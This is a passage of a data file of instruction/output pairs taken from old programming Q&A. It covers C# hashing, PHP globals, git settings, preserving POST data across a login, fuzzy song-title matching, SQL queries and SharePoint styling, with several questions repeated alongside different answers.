};\nbyte[] b2 = new byte[] { 1 };\nint h1 = b1.GetHashCode();\nint h2 = b2.GetHashCode();\n\nWith that code, despite the two byte arrays having the same values within them, they are referring to different parts of memory and will result in (probably) different hash codes. I need the hash codes for two byte arrays with the same contents to be equal.", "output": "Whether you want a perfect hashfunction (different value for each object that evaluates to equal) or just a pretty good one is always a performance tradeoff, it takes normally time to compute a good hashfunction and if your dataset is smallish you're better of with a fast function. The most important (as your second post points out) is correctness, and to achieve that all you need is to return the Length of the array. Depending on your dataset that might even be ok. If it isn't (say all your arrays are equally long) you can go with something cheap like looking at the first and last value and XORing their values and then add more complexity as you see fit for your data. \nA quick way to see how your hashfunction performs on your data is to add all the data to a hashtable and count the number of times the Equals function gets called, if it is too often you have more work to do on the function. If you do this just keep in mind that the hashtable's size needs to be set bigger than your dataset when you start, otherwise you are going to rehash the data which will trigger reinserts and more Equals evaluations (though possibly more realistic?)\nFor some objects (not this one) a quick HashCode can be generated by ToString().GetHashCode(), certainly not optimal, but useful as people tend to return something close to the identity of the object from ToString() and that is exactly what GetHashcode is looking for\nTrivia: The worst performance I have ever seen was when someone by mistake returned a constant from GetHashCode, easy to spot with a debugger though, especially if you do lots of lookups in your hashtable"}
{"instruction": "Can anyone point me to a good introduction to coding against the paypal API?", "output": "I would suggest you start by downloading the SDK:\nhttps://www.paypal.com/IntegrationCenter/ic_sdk-resource.html\nThe SDK includes the following:\n\nClient libraries that call PayPal APIs\nAPI documentation for SDK components\nSample code for Website Payments Pro and various administrative APIs\nTesting console that can verify connectivity to PayPal and submit API calls\n\nYou may also want to take a look at Encore Systems .NET* Class Library for PayPal SOAP API"}
{"instruction": "I want to define something like this in php:\n$EL = \"\\n<br />\\n\";\n\nand then use that variable as an \"endline\" marker all over my site, like this:\necho \"Blah blah blah{$EL}\";\n\nHow do I define $EL once (in only 1 file), include it on every page on my site, and not have to reference it using the (strangely backwards) global $EL; statement in every page function?", "output": "Another option is to use an object with public static properties. I used to use $GLOBALS but most editors don't auto complete $GLOBALS. Also, un-instantiated classes are available everywhere (because you can instatiate everywhere without telling PHP you are going to use the class). Example:\n<?php\n\nclass SITE {\n    public static $el;\n}\n\nSITE::$el = \"\\n<br />\\n\";\n\nfunction Test() {\n    echo SITE::$el;\n}\n\nTest();\n\n?>\n\nThis will output <br />\nThis is also easier to deal with than costants as you can put any type of value within the property (array, string, int, etc) whereas constants cannot contain arrays.\nThis was suggested to my by a user on the PhpEd forums."}
{"instruction": "I have to use a third-party component without source code. I have the release DLL and release PDB file. Let's call it 'CorporateComponent.dll'. My own code creates objects from this DLL and calls methods on these objects.\nCorpObject o = new CorpObject();\nInt32 result = o.DoSomethingLousy();\n\nWhile debugging, the method 'DoSomethingLousy' throws an exception. What does the PDB file do for me? If it does something nice, how can I be sure I'm making use of it?", "output": "To confirm if you're using the provided PDB, CorporateComponent.pdb, during debugging within the Visual Studio IDE review the output window and locate the line indicating that the CorporateComponent.dll is loaded and followed by the string Symbols loaded.\nTo illustrate from a project of mine:\nThe thread 0x6a0 has exited with code 0 (0x0).\nThe thread 0x1f78 has exited with code 0 (0x0).\n'AvayaConfigurationService.vshost.exe' (Managed): Loaded 'C:\\Development\\Src\\trunk\\ntity\\AvayaConfigurationService\\AvayaConfigurationService\\bin\\Debug  \\AvayaConfigurationService.exe', Symbols loaded.\n'AvayaConfigurationService.vshost.exe' (Managed): Loaded 'C:\\Development\\Src\\trunk\\ntity\\AvayaConfigurationService\\AvayaConfigurationService\\bin\\Debug\\IPOConfigService.dll', No symbols loaded.\n\n\nLoaded 'C:\\Development\\src...\\bin\\Debug\\AvayaConfigurationService.exe', Symbols loaded.\n\nThis indicates that the PDB was found and loaded by the IDE debugger.\nAs indicated by others When examining stack frames within your application you should be able to see the symbols from the CorporateComponent.pdb. If you don't then perhaps the third-party did not include symbol information in the release PDB build."}
{"instruction": "I'm not too sure what is going on here, but sometimes a particular file in my repository will change the case of it's name. e.g.,:\nbefore: File.h\nafter: file.h\nI don't really care why this is happening, but this causes git to think it is a new file, and then I have to go and change the file name back. Can you just make git ignore case changes?\n[edit]\nI suspect it is Visual Studio doing something weird with that particular file, because it seems to happen most often when I open and save it after changes. I don't have any way to fix bugs in VS however, but git should be a bit more capable I hope.", "output": "Since version 1.5.6 there is an ignorecase option available in the [core] section of .git/config\ne.g. add ignorecase = true\nTo change it for just one repo, from that folder run:\ngit config core.ignorecase true\n\nTo change it globally: \ngit config --global core.ignorecase true"}
{"instruction": "Can anyone point me to a good introduction to coding against the paypal API?", "output": "Found this article by Rick Strahl recently http://www.west-wind.com/presentations/PayPalIntegration/PayPalIntegration.asp.  \nHave not implemeted anything from it yet, Rick has quite a few articles around the web on ecommerce in aspnet, and he seems to show up everytime I'm searching for it."}
{"instruction": "I created a few mediawiki custom tags, using the guide found here\nhttp://www.mediawiki.org/wiki/Manual:Tag_extensions\nI will post my code below, but the problem is after it hits the first custom tag in the page, it calls it, and prints the response, but does not get anything that comes after it in the wikitext. It seems it just stops parsing the page.\nAny Ideas?\nif ( defined( 'MW_SUPPORTS_PARSERFIRSTCALLINIT' ) ) {\n     $wgHooks['ParserFirstCallInit'][] = 'tagregister';\n} else { // Otherwise do things the old fashioned way\n     $wgExtensionFunctions[] = 'tagregister';\n}\n\nfunction tagregister(){\n  global $wgParser;\n  $wgParser->setHook('tag1','tag1func');\n  $wgParser->setHook('tag2','tag2func');\n  return true;\n}\n\nfunction tag1func($input,$params)\n{\n  return \"It called me\";\n}\n\nfunction tag2func($input,$params)\n{\n  return \"It called me -- 2\";\n}\nUpdate: @George Mauer --  I have seen that as well, but this does not stop the page from rendering, just the Mediawiki engine from parsing the rest of the wikitext. Its as if hitting the custom function is signalling mediawiki that processing is done. I am in the process of diving into the rabbit hole but was hoping someone else has seen this behaviour.", "output": "Silly me. \nHad to close the tags.\nInstead of<tag1> I had to change it to <tag1 /> or <tag1></tag1>\nNow all works!"}
{"instruction": "I've got a search results page that basically consists of a repeater with content in it.  What I need is a way to paginate the results.  Getting paginated results isn't the problem, what I'm after is a web control that will display a list of the available paged data, preferably by providing the number of results and a page size", "output": "Repeaters don't do this by default.\nHowever, GridViews do.\nPersonally, I hate GridViews, so I wrote a Paging/Sorting Repeater control.\nBasic Steps:\n\nSubclass the Repeater Control\nAdd a private PagedDataSource to it\nAdd a public PageSize property\nOverride Control.DataBind\n\nStore the Control.DataSource in the PagedDataSource.\nBind the Control.DataSource to PagedDataSource\n\nOverride Control.Render\n\nCall Base.Render()\nRender your paging links.\n\n\nFor a walkthrough, you could try this link:\nhttp://aspnet.4guysfromrolla.com/articles/081804-1.aspx"}
{"instruction": "Say a user is browsing a website, and then performs some action which changes the database (let's say they add a comment). When the request to actually add the comment comes in, however, we find we need to force them to login before they can continue.\nAssume the login page asks for a username and password, and redirects the user back to the URL they were going to when the login was required. That redirect works find for a URL with only GET parameters, but if the request originally contained some HTTP POST data, that is now lost.\nCan anyone recommend a way to handle this scenario when HTTP POST data is involved?\nObviously, if necessary, the login page could dynamically generate a form with all the POST parameters to pass them along (though that seems messy), but even then, I don't know of any way for the login page to redirect the user on to their intended page while keeping the POST data in the request.\n\nEdit : One extra constraint I should have made clear - Imagine we don't know if a login will be required until the user submits their comment. For example, their cookie might have expired between when they loaded the form and actually submitted the comment.", "output": "This is one good place where Ajax techniques might be helpful. When the user clicks the submit button, show the login dialog on client side and validate with the server before you actually submit the page.\nAnother way I can think of is showing or hiding the login controls in a DIV tag dynamically in the main page itself."}
{"instruction": "Say a user is browsing a website, and then performs some action which changes the database (let's say they add a comment). When the request to actually add the comment comes in, however, we find we need to force them to login before they can continue.\nAssume the login page asks for a username and password, and redirects the user back to the URL they were going to when the login was required. That redirect works find for a URL with only GET parameters, but if the request originally contained some HTTP POST data, that is now lost.\nCan anyone recommend a way to handle this scenario when HTTP POST data is involved?\nObviously, if necessary, the login page could dynamically generate a form with all the POST parameters to pass them along (though that seems messy), but even then, I don't know of any way for the login page to redirect the user on to their intended page while keeping the POST data in the request.\n\nEdit : One extra constraint I should have made clear - Imagine we don't know if a login will be required until the user submits their comment. For example, their cookie might have expired between when they loaded the form and actually submitted the comment.", "output": "Collect the data on the page they submitted it, and store it in your backend (database?) while they go off through the login sequence, hide a transaction id or similar on the page with the login form. When they're done, return them to the page they asked for by looking it up using the transaction id on the backend, and dump all the data they posted into the form for previewing again, or just run whatever code that page would run.\nNote that many systems, eg blogs, get around this by having login fields in the same form as the one for posting comments, if the user needs to be logged in to comment and isn't yet."}
{"instruction": "Say a user is browsing a website, and then performs some action which changes the database (let's say they add a comment). When the request to actually add the comment comes in, however, we find we need to force them to login before they can continue.\nAssume the login page asks for a username and password, and redirects the user back to the URL they were going to when the login was required. That redirect works find for a URL with only GET parameters, but if the request originally contained some HTTP POST data, that is now lost.\nCan anyone recommend a way to handle this scenario when HTTP POST data is involved?\nObviously, if necessary, the login page could dynamically generate a form with all the POST parameters to pass them along (though that seems messy), but even then, I don't know of any way for the login page to redirect the user on to their intended page while keeping the POST data in the request.\n\nEdit : One extra constraint I should have made clear - Imagine we don't know if a login will be required until the user submits their comment. For example, their cookie might have expired between when they loaded the form and actually submitted the comment.", "output": "Just store all the necessary data from the POST in the session until after the login process is completed. Or have some sort of temp table in the db to store in and then retrieve it. Obviously this is pseudo-code but:\nif ( !loggedIn ) {\n    StorePostInSession();\n    ShowLoginForm();\n}\n\nif ( postIsStored ) {\n    RetrievePostFromSession();\n}\n\nOr something along those lines."}
{"instruction": "I'd really like to get our host to pull from our Git repository instead of uploading files manually, but it doesn't have Git installed.\nSo is there a way to trick Subversion (which they do have) into checking out a Git repository?\nI think I already know the answer, namely bug my host to add Git and live with it until they do, but I thought I would ask anyway.", "output": "This page should provide a workaround for your problem. \nhttp://code.google.com/p/support/wiki/ImportingFromGit\nBasically, you create a read-only clone of your Git repository in the SVN repository format, exporting updates as you go. An SVN hook could be written that fires after each update to copy the new files where you need them."}
{"instruction": "Say a user is browsing a website, and then performs some action which changes the database (let's say they add a comment). When the request to actually add the comment comes in, however, we find we need to force them to login before they can continue.\nAssume the login page asks for a username and password, and redirects the user back to the URL they were going to when the login was required. That redirect works find for a URL with only GET parameters, but if the request originally contained some HTTP POST data, that is now lost.\nCan anyone recommend a way to handle this scenario when HTTP POST data is involved?\nObviously, if necessary, the login page could dynamically generate a form with all the POST parameters to pass them along (though that seems messy), but even then, I don't know of any way for the login page to redirect the user on to their intended page while keeping the POST data in the request.\n\nEdit : One extra constraint I should have made clear - Imagine we don't know if a login will be required until the user submits their comment. For example, their cookie might have expired between when they loaded the form and actually submitted the comment.", "output": "2 choices:\n\nWrite out the messy form from the login page, and JavaScript form.submit() it to the page.\nHave the login page itself POST to the requesting page (with the previous values), and have that page's controller perform the login verification. Roll this into whatever logic you already have for detecting the not logged in user (frameworks vary on how they do this). In pseudo-MVC:\n\n\n        CommentController {\n           void AddComment() {\n             if (!Request.User.IsAuthenticated && !AuthenticateUser()) {\n                return;\n             }\n             // add comment to database\n           }\n\n           bool AuthenticateUser() {\n             if (Request.Form[\"username\"] == \"\") {\n                // show login page\n                foreach (Key key in Request.Form) {\n                   // copy form values\n                   ViewData.Form.Add(\"hidden\", key, Request.Form[key]);\n                }\n                ViewData.Form.Action = Request.Url;\n\n                ShowLoginView();\n                return false;\n              } else {\n                 // validate login\n                 return TryLogin(Request.Form[\"username\"], Request.Form[\"password\"]);\n              } \n           }\n        }"}
{"instruction": "Say a user is browsing a website, and then performs some action which changes the database (let's say they add a comment). When the request to actually add the comment comes in, however, we find we need to force them to login before they can continue.\nAssume the login page asks for a username and password, and redirects the user back to the URL they were going to when the login was required. That redirect works find for a URL with only GET parameters, but if the request originally contained some HTTP POST data, that is now lost.\nCan anyone recommend a way to handle this scenario when HTTP POST data is involved?\nObviously, if necessary, the login page could dynamically generate a form with all the POST parameters to pass them along (though that seems messy), but even then, I don't know of any way for the login page to redirect the user on to their intended page while keeping the POST data in the request.\n\nEdit : One extra constraint I should have made clear - Imagine we don't know if a login will be required until the user submits their comment. For example, their cookie might have expired between when they loaded the form and actually submitted the comment.", "output": "I know it says language-agnostic, but why not take advantage of the conventions provided by the server-side language you are using? If it were Java, the data could persist by setting a Request attribute. You would use a controller to process the form, detect the login, and then forward through. If the attributes are set, then just prepopulate the form with that data?\nEdit: You could also use a Session as pointed out, but I'm pretty sure if you use a forward in Java back to the login page, that the Request attribute will persist."}
{"instruction": "Say a user is browsing a website, and then performs some action which changes the database (let's say they add a comment). When the request to actually add the comment comes in, however, we find we need to force them to login before they can continue.\nAssume the login page asks for a username and password, and redirects the user back to the URL they were going to when the login was required. That redirect works find for a URL with only GET parameters, but if the request originally contained some HTTP POST data, that is now lost.\nCan anyone recommend a way to handle this scenario when HTTP POST data is involved?\nObviously, if necessary, the login page could dynamically generate a form with all the POST parameters to pass them along (though that seems messy), but even then, I don't know of any way for the login page to redirect the user on to their intended page while keeping the POST data in the request.\n\nEdit : One extra constraint I should have made clear - Imagine we don't know if a login will be required until the user submits their comment. For example, their cookie might have expired between when they loaded the form and actually submitted the comment.", "output": "You might want to investigate why Django removed this feature  before implementing it yourself.  It doesn't seem like a Django specific problem, but rather yet another cross site forgery attack."}
{"instruction": "I keep running across this loading image\nhttp://georgia.ubuntuforums.com/images/misc/lightbox_progress.gif\nwhich seems to have entered into existence in the last 18 months.  All of a sudden it is in every application and is on every web site.  Not wanting to be left out is there somewhere I can get this logo, perhaps with a transparent background?  Also where did it come from?", "output": "You can get many different AJAX loading animations in any colour you want here: ajaxload.info"}
{"instruction": "I keep running across this loading image\nhttp://georgia.ubuntuforums.com/images/misc/lightbox_progress.gif\nwhich seems to have entered into existence in the last 18 months.  All of a sudden it is in every application and is on every web site.  Not wanting to be left out is there somewhere I can get this logo, perhaps with a transparent background?  Also where did it come from?", "output": "I believe the animation came from the Mac OS X loading screen. Here's a similar one with a transparent background:"}
{"instruction": "I keep running across this loading image\nhttp://georgia.ubuntuforums.com/images/misc/lightbox_progress.gif\nwhich seems to have entered into existence in the last 18 months.  All of a sudden it is in every application and is on every web site.  Not wanting to be left out is there somewhere I can get this logo, perhaps with a transparent background?  Also where did it come from?", "output": "I think it's just a general extension to the normal clock-face style loading icon.  The Firefox throbber is the first example of that style that I remember coming across; the only real difference between that and the current trend of straight lines is that the constituent symbols have been stretched to give a crisper look, moving back to more of a many-handed clock emblem."}
{"instruction": "Can anyone point me to a good introduction to coding against the paypal API?", "output": "I don't know what your needs are, but you might want to consider Google Checkout.  Joe Audette was having considerable difficulty integrating PayPal.\nI've used Google Checkout and have had great success.  Note that you can go much, MUCH deeper with Google Checkout than the sample linked above.\n\nEDIT: I didn't see Joe's updates.  Look like he did eventually get it working."}
{"instruction": "Say I'm building an ASP.Net class that inherits from IHttpHandler, should I wire this up to a URL ending in .ashx, or should I use the .axd extension? \nDoes it matter as long as there's no naming conflict?", "output": "Ahh.. ScottGu says it doesn't matter, but .ashx is slightly better because there's less chance of a conflict with things like trace.axd and others. That's why the flag went up in my head that .ashx might be better.\nhttp://forums.asp.net/t/964074.aspx"}
{"instruction": "Say I'm building an ASP.Net class that inherits from IHttpHandler, should I wire this up to a URL ending in .ashx, or should I use the .axd extension? \nDoes it matter as long as there's no naming conflict?", "output": "Out in \"the wild\", .ashx are definitely the most popular extension."}
{"instruction": "Hey, I'm using Levenshteins algorithm to get distance between source and target string.\nalso I have method which returns value from 0 to 1:\n/// <summary>\n/// Gets the similarity between two strings.\n/// All relation scores are in the [0, 1] range, \n/// which means that if the score gets a maximum value (equal to 1) \n/// then the two string are absolutely similar\n/// </summary>\n/// <param name=\"string1\">The string1.</param>\n/// <param name=\"string2\">The string2.</param>\n/// <returns></returns>\npublic static float CalculateSimilarity(String s1, String s2)\n{\n    if ((s1 == null) || (s2 == null)) return 0.0f;\n\n    float dis = LevenshteinDistance.Compute(s1, s2);\n    float maxLen = s1.Length;\n    if (maxLen < s2.Length)\n        maxLen = s2.Length;\n    if (maxLen == 0.0F)\n        return 1.0F;\n    else return 1.0F - dis / maxLen;\n}\n\nbut this for me is not enough. Because I need more complex way to match two sentences.\nFor example I want automatically tag some music, I have original song names, and i have songs with trash, like super, quality, years like 2007, 2008, etc..etc.. also some files have just http://trash..thash..song_name_mp3.mp3, other are normal. I want to create an algorithm which will work just more perfect than mine now.. Maybe anyone can help me?\nhere is my current algo:\n/// <summary>\n/// if we need to ignore this target.\n/// </summary>\n/// <param name=\"targetString\">The target string.</param>\n/// <returns></returns>\nprivate bool doIgnore(String targetString)\n{\n    if ((targetString != null) && (targetString != String.Empty))\n    {\n        for (int i = 0; i < ignoreWordsList.Length; ++i)\n        {\n            //* if we found ignore word or target string matching some some special cases like years (Regex).\n            if (targetString == ignoreWordsList[i] || (isMatchInSpecialCases(targetString))) return true;\n        }\n    }\n\n   return false;\n}\n\n/// <summary>\n/// Removes the duplicates.\n/// </summary>\n/// <param name=\"list\">The list.</param>\nprivate void removeDuplicates(List<String> list)\n{\n    if ((list != null) && (list.Count > 0))\n    {\n        for (int i = 0; i < list.Count - 1; ++i)\n        {\n            if (list[i] == list[i + 1])\n            {\n                list.RemoveAt(i);\n                --i;\n            }\n        }\n    }\n}\n\n/// <summary>\n/// Does the fuzzy match.\n/// </summary>\n/// <param name=\"targetTitle\">The target title.</param>\n/// <returns></returns>\nprivate TitleMatchResult doFuzzyMatch(String targetTitle)\n{\n    TitleMatchResult matchResult = null;\n\n   if (targetTitle != null && targetTitle != String.Empty)\n   {\n       try\n       {\n           //* change target title (string) to lower case.\n           targetTitle = targetTitle.ToLower();\n\n           //* scores, we will select higher score at the end.\n           Dictionary<Title, float> scores = new Dictionary<Title, float>();\n\n           //* do split special chars: '-', ' ', '.', ',', '?', '/', ':', ';', '%', '(', ')', '#', '\\\"', '\\'', '!', '|', '^', '*', '[', ']', '{', '}', '=', '!', '+', '_'\n           List<String> targetKeywords = new List<string>(targetTitle.Split(ignoreCharsList, StringSplitOptions.RemoveEmptyEntries));\n\n          //* remove all trash from keywords, like super, quality, etc..\n           targetKeywords.RemoveAll(delegate(String x) { return doIgnore(x); });\n          //* sort keywords.\n          targetKeywords.Sort();\n        //* remove some duplicates.\n        removeDuplicates(targetKeywords);\n\n        //* go through all original titles.\n        foreach (Title sourceTitle in titles)\n        {\n            float tempScore = 0f;\n            //* split orig. title to keywords list.\n            List<String> sourceKeywords = new List<string>(sourceTitle.Name.Split(ignoreCharsList, StringSplitOptions.RemoveEmptyEntries));\n            sourceKeywords.Sort();\n            removeDuplicates(sourceKeywords);\n\n            //* go through all source ttl keywords.\n            foreach (String keyw1 in sourceKeywords)\n            {\n                float max = float.MinValue;\n                foreach (String keyw2 in targetKeywords)\n                {\n                    float currentScore = StringMatching.StringMatching.CalculateSimilarity(keyw1.ToLower(), keyw2);\n                    if (currentScore > max)\n                    {\n                        max = currentScore;\n                    }\n                }\n                tempScore += max;\n            }\n\n            //* calculate average score.\n            float averageScore = (tempScore / Math.Max(targetKeywords.Count, sourceKeywords.Count)); \n\n            //* if average score is bigger than minimal score and target title is not in this source title ignore list.\n            if (averageScore >= minimalScore && !sourceTitle.doIgnore(targetTitle))\n            {\n                //* add score.\n                scores.Add(sourceTitle, averageScore);\n            }\n        }\n\n        //* choose biggest score.\n        float maxi = float.MinValue;\n        foreach (KeyValuePair<Title, float> kvp in scores)\n        {\n            if (kvp.Value > maxi)\n            {\n                maxi = kvp.Value;\n                matchResult = new TitleMatchResult(maxi, kvp.Key, MatchTechnique.FuzzyLogic);\n            }\n        }\n    }\n    catch { }\n}\n//* return result.\nreturn matchResult;\n}\n\nThis works normally but just in some cases, a lot of titles which should match, does not match... I think I need some kind of formula to play with weights and etc, but i can't think of one.. \nIdeas? Suggestions? Algos?\nby the way I already know this topic (My colleague already posted it but we cannot come with a proper solution for this problem.): \nhttp://stackoverflow.com/questions/49263/approximate-string-matching-algorithms", "output": "It sounds like what you want may be a longest substring match. That is, in your example, two files like\ntrash..thash..song_name_mp3.mp3\nand\ngarbage..spotch..song_name_mp3.mp3\nwould end up looking the same.\nYou'd need some heuristics there, of course. One thing you might try is putting the string through a soundex converter. Soundex is the \"codec\" used to see if things \"sound\" the same (as you might tell a telephone operator). It's more or less a rough phonetic and mispronunciation semi-proof transliteration. It is definitely poorer than edit distance, but much, much cheaper. (The official use is for names, and only uses three characters. There's no reason to stop there, though, just use the mapping for every character in the string. See wikipedia for details)\nSo my suggestion would be to soundex your strings, chop each one into a few length tranches (say 5, 10, 20) and then just look at clusters. Within clusters you can use something more expensive like edit distance or max substring."}
{"instruction": "Hey, I'm using Levenshteins algorithm to get distance between source and target string.\nalso I have method which returns value from 0 to 1:\n/// <summary>\n/// Gets the similarity between two strings.\n/// All relation scores are in the [0, 1] range, \n/// which means that if the score gets a maximum value (equal to 1) \n/// then the two string are absolutely similar\n/// </summary>\n/// <param name=\"string1\">The string1.</param>\n/// <param name=\"string2\">The string2.</param>\n/// <returns></returns>\npublic static float CalculateSimilarity(String s1, String s2)\n{\n    if ((s1 == null) || (s2 == null)) return 0.0f;\n\n    float dis = LevenshteinDistance.Compute(s1, s2);\n    float maxLen = s1.Length;\n    if (maxLen < s2.Length)\n        maxLen = s2.Length;\n    if (maxLen == 0.0F)\n        return 1.0F;\n    else return 1.0F - dis / maxLen;\n}\n\nbut this for me is not enough. Because I need more complex way to match two sentences.\nFor example I want automatically tag some music, I have original song names, and i have songs with trash, like super, quality, years like 2007, 2008, etc..etc.. also some files have just http://trash..thash..song_name_mp3.mp3, other are normal. I want to create an algorithm which will work just more perfect than mine now.. Maybe anyone can help me?\nhere is my current algo:\n/// <summary>\n/// if we need to ignore this target.\n/// </summary>\n/// <param name=\"targetString\">The target string.</param>\n/// <returns></returns>\nprivate bool doIgnore(String targetString)\n{\n    if ((targetString != null) && (targetString != String.Empty))\n    {\n        for (int i = 0; i < ignoreWordsList.Length; ++i)\n        {\n            //* if we found ignore word or target string matching some some special cases like years (Regex).\n            if (targetString == ignoreWordsList[i] || (isMatchInSpecialCases(targetString))) return true;\n        }\n    }\n\n   return false;\n}\n\n/// <summary>\n/// Removes the duplicates.\n/// </summary>\n/// <param name=\"list\">The list.</param>\nprivate void removeDuplicates(List<String> list)\n{\n    if ((list != null) && (list.Count > 0))\n    {\n        for (int i = 0; i < list.Count - 1; ++i)\n        {\n            if (list[i] == list[i + 1])\n            {\n                list.RemoveAt(i);\n                --i;\n            }\n        }\n    }\n}\n\n/// <summary>\n/// Does the fuzzy match.\n/// </summary>\n/// <param name=\"targetTitle\">The target title.</param>\n/// <returns></returns>\nprivate TitleMatchResult doFuzzyMatch(String targetTitle)\n{\n    TitleMatchResult matchResult = null;\n\n   if (targetTitle != null && targetTitle != String.Empty)\n   {\n       try\n       {\n           //* change target title (string) to lower case.\n           targetTitle = targetTitle.ToLower();\n\n           //* scores, we will select higher score at the end.\n           Dictionary<Title, float> scores = new Dictionary<Title, float>();\n\n           //* do split special chars: '-', ' ', '.', ',', '?', '/', ':', ';', '%', '(', ')', '#', '\\\"', '\\'', '!', '|', '^', '*', '[', ']', '{', '}', '=', '!', '+', '_'\n           List<String> targetKeywords = new List<string>(targetTitle.Split(ignoreCharsList, StringSplitOptions.RemoveEmptyEntries));\n\n          //* remove all trash from keywords, like super, quality, etc..\n           targetKeywords.RemoveAll(delegate(String x) { return doIgnore(x); });\n          //* sort keywords.\n          targetKeywords.Sort();\n        //* remove some duplicates.\n        removeDuplicates(targetKeywords);\n\n        //* go through all original titles.\n        foreach (Title sourceTitle in titles)\n        {\n            float tempScore = 0f;\n            //* split orig. title to keywords list.\n            List<String> sourceKeywords = new List<string>(sourceTitle.Name.Split(ignoreCharsList, StringSplitOptions.RemoveEmptyEntries));\n            sourceKeywords.Sort();\n            removeDuplicates(sourceKeywords);\n\n            //* go through all source ttl keywords.\n            foreach (String keyw1 in sourceKeywords)\n            {\n                float max = float.MinValue;\n                foreach (String keyw2 in targetKeywords)\n                {\n                    float currentScore = StringMatching.StringMatching.CalculateSimilarity(keyw1.ToLower(), keyw2);\n                    if (currentScore > max)\n                    {\n                        max = currentScore;\n                    }\n                }\n                tempScore += max;\n            }\n\n            //* calculate average score.\n            float averageScore = (tempScore / Math.Max(targetKeywords.Count, sourceKeywords.Count)); \n\n            //* if average score is bigger than minimal score and target title is not in this source title ignore list.\n            if (averageScore >= minimalScore && !sourceTitle.doIgnore(targetTitle))\n            {\n                //* add score.\n                scores.Add(sourceTitle, averageScore);\n            }\n        }\n\n        //* choose biggest score.\n        float maxi = float.MinValue;\n        foreach (KeyValuePair<Title, float> kvp in scores)\n        {\n            if (kvp.Value > maxi)\n            {\n                maxi = kvp.Value;\n                matchResult = new TitleMatchResult(maxi, kvp.Key, MatchTechnique.FuzzyLogic);\n            }\n        }\n    }\n    catch { }\n}\n//* return result.\nreturn matchResult;\n}\n\nThis works normally but just in some cases, a lot of titles which should match, does not match... I think I need some kind of formula to play with weights and etc, but i can't think of one.. \nIdeas? Suggestions? Algos?\nby the way I already know this topic (My colleague already posted it but we cannot come with a proper solution for this problem.): \nhttp://stackoverflow.com/questions/49263/approximate-string-matching-algorithms", "output": "Your problem here may be distinguishing between noise words and useful data:\n\nRolling_Stones.Best_of_2003.Wild_Horses.mp3\nSuper.Quality.Wild_Horses.mp3\nTori_Amos.Wild_Horses.mp3\n\nYou may need to produce a dictionary of noise words to ignore. That seems clunky, but I'm not sure there's an algorithm that can distinguish between band/album names and noise."}
{"instruction": "Possible Duplicate:\nNAnt or MSBuild, which one to choose and when? \n\nWhat is the best build tool for .NET?\nI currently use NAnt but only because I have experience with Ant. Is MSBuild preferred?", "output": "Using a dynamic scripting language like Python, BOO, Ruby, etc. to create and maintain build scripts might be a good alternative to an XML based one like NAnt. (They tend to be cleaner to read than XML.)"}
{"instruction": "Possible Duplicate:\nNAnt or MSBuild, which one to choose and when? \n\nWhat is the best build tool for .NET?\nI currently use NAnt but only because I have experience with Ant. Is MSBuild preferred?", "output": "I use a commercial software, Automated Build Studio for the build purpose."}
{"instruction": "I've created a custom list, and made some changes to the way the CQWP renders it on a page by modifying ItemStyle.xsl. However, I'd like to use some custom css classes and therefore I'd like to link to my own custom .css file from the head tag of the pages containing this CQWP.\nSo my question is, where to do put my .css file and how do I link it properly to a page containing the CQWPs. Please have in mind that I'm making a solution that should be deployed on multi sharepoint installations.\nThanks.", "output": "Consider uploading them to \"Style Library\" in the root of the site collection.\nIf you don't have a \"Style Library\" at the root, consider making one -- it's just a document library.\nMake sure the permissions are set correctly so everyone who needs to read it can.\nYou can reference them using \"/Style%20Library/my.css\" but this won't work on site collections that don't live at the root of the domain."}
{"instruction": "I want to define something like this in php:\n$EL = \"\\n<br />\\n\";\n\nand then use that variable as an \"endline\" marker all over my site, like this:\necho \"Blah blah blah{$EL}\";\n\nHow do I define $EL once (in only 1 file), include it on every page on my site, and not have to reference it using the (strangely backwards) global $EL; statement in every page function?", "output": "svec, use a PHP framework. Just any - there's plenty of them out there.\nThis is the right way to do it. With framework you have single entry\npoint for your application, so defining site-wide variables is easy and\nnatural. Also you don't need to care about including header files nor\nchecking if user is logged in on every page - decent framework will do\nit for you.\nSee:\n\nZend framework\nCakePHP\nSymfony\nKohana\n\nInvest some time in learning one of them and it will pay back very soon."}
{"instruction": "Possible Duplicate:\nSQL Query to get latest price \n\nI have a database containing stock price history. I want to select most recent prices for every stock that is listed. I know PostreSQL has a DISTINCT ON statement that would suit ideally here.\nTable columns are name, closingPrice and date; name and date together form a unique index.\nThe easiest (and very uneffective) way is\nSELECT * FROM stockPrices s\nWHERE s.date =\n(SELECT MAX(date) FROM stockPrices si WHERE si.name = s.name);\n\nMuch better approach I found is\nSELECT *\nFROM stockPrices s JOIN (\n  SELECT name, MAX(date) AS date\n  FROM stockPrices si\n  GROUP BY name\n) lastEntry ON s.name = lastEntry.name AND s.date = lastEntry.date;\n\nWhat would be an efficient way to do this? What indexes should I create?\n\nduplicate of:\nSQL Query to get latest price", "output": "See similar post"}
{"instruction": "Possible Duplicate:\nSQL Query to get latest price \n\nI have a database containing stock price history. I want to select most recent prices for every stock that is listed. I know PostreSQL has a DISTINCT ON statement that would suit ideally here.\nTable columns are name, closingPrice and date; name and date together form a unique index.\nThe easiest (and very uneffective) way is\nSELECT * FROM stockPrices s\nWHERE s.date =\n(SELECT MAX(date) FROM stockPrices si WHERE si.name = s.name);\n\nMuch better approach I found is\nSELECT *\nFROM stockPrices s JOIN (\n  SELECT name, MAX(date) AS date\n  FROM stockPrices si\n  GROUP BY name\n) lastEntry ON s.name = lastEntry.name AND s.date = lastEntry.date;\n\nWhat would be an efficient way to do this? What indexes should I create?\n\nduplicate of:\nSQL Query to get latest price", "output": "I think that your second approach is very efficient. What's its problem?\nYou have to add indexes to name and date."}
{"instruction": "I've created a custom list, and made some changes to the way the CQWP renders it on a page by modifying ItemStyle.xsl. However, I'd like to use some custom css classes and therefore I'd like to link to my own custom .css file from the head tag of the pages containing this CQWP.\nSo my question is, where to do put my .css file and how do I link it properly to a page containing the CQWPs. Please have in mind that I'm making a solution that should be deployed on multi sharepoint installations.\nThanks.", "output": "The microsoft official way is just to copy them into the relevant folders (as seen by downloading their template packs).  However, you could also create your own site definition and add the items to the correct libraries and lists in the same way that the master pages are added.\nIf you are going to deploy CSS and Master Pages through features remember you will have to activate your the publishing infrastructure on the site collection and the publishing feature on the site.\nTo deploy a master page/page layout as a feature you should follow the steps at the site  below, you can use the \"fileurl\" element to specify your CSS and place it into the correct folder (style library, for example):\nhttp://www.sharepointnutsandbolts.com/2007/04/deploying-master-pages-and-page-layouts.html"}
